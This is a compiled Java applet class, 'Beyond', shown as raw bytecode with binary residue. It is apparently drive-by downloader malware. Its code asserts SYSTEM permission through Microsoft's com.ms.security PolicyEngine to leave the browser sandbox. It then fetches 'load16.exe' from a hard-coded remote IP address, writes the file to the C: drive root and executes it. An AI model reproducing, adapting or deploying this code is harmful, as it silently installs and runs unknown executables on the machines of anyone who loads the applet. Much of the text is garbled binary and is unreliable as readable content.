����  - d  Beyond  java/lang/Object <init> ()V Code LineNumberTable  
  	   SYSTEM Lcom/ms/security/PermissionID;	    com/ms/security/PermissionID   assertPermission !(Lcom/ms/security/PermissionID;)V
    com/ms/security/PolicyEngine  
load16.exe  c:\  http://195.225.176.3/mas2/      java/lang/StringBuffer
  	 # $ append ,(Ljava/lang/String;)Ljava/lang/StringBuffer;
  " ' ( toString ()Ljava/lang/String;
  & + java/io/File  - (Ljava/lang/String;)V
 * , 0 1 exists ()Z
 * / 4 java/net/URL
 3 , 7 8 openConnection ()Ljava/net/URLConnection;
 3 6 ; < getInputStream ()Ljava/io/InputStream;
 > : ? java/net/URLConnection A java/io/FileOutputStream
 @ , D E write ([BII)V
 @ C H I read ([B)I
 K G L java/io/InputStream N  close
 @ M
 K M R java/io/IOException T  printStackTrace
 Q S W X 
getRuntime ()Ljava/lang/Runtime;
 Z V [ java/lang/Runtime ] ^ exec '(Ljava/lang/String;)Ljava/lang/Process;
 Z \ a java/lang/Throwable 
SourceFile Beyond.java !              N     �*� 
� � LMN:� Y� !,� %+� %� ):� Y� !,� %+� %� %� ):� *Y� .� 2� k� 3Y� Y� !-� %+� %� )� 5� 9:� =:� @Y� B:	 �:
6� 	
� F
� JY6���	� O� P� 
:� U� Y� _:� L�  S � � Q  � � `     b         
          +  D  S  S  q   x ! � " � # � $ � % � $ � & � ' � ) � . � 0  b    c